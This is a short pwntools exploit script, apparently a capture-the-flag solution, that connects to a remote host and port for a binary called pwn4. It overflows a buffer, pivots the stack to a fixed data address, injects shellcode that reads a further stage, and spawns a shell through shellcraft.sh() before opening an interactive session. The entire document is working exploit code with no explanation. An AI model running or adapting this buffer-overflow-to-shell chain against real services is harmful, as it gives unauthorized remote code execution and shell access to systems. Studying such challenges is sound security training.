from pwn import *

# p = process("./pwn3")
context.log_level = "debug"
p = remote("114.116.54.89" , 10004)
elf = ELF("./pwn4") 
context.arch = "amd64"

read_addr = 0x40072A
data = 0x0601060
payload = "a" * 0x10 + p64(data + 0x10) + p64(read_addr)
p.sendafter("Come on,try to pwn me\n" , payload) # ebp->data + 0x10
# read(0 , data , 0x30)
# gdb.attach(p , "b *0x40074F")
add_esp = 0x000000000040053d 
payload = asm(shellcraft.read(0 , "rbp" , 0x100)).rjust(0x10 , "a") + p64(data + 0x10) + p64(data + 3)
p.sendafter("So~sad,you are fail\n" , payload) 
payload = asm("add rsp , 0x80") + asm(shellcraft.sh())
p.sendafter("So~sad,you are fail\n" , payload) 

p.interactive()


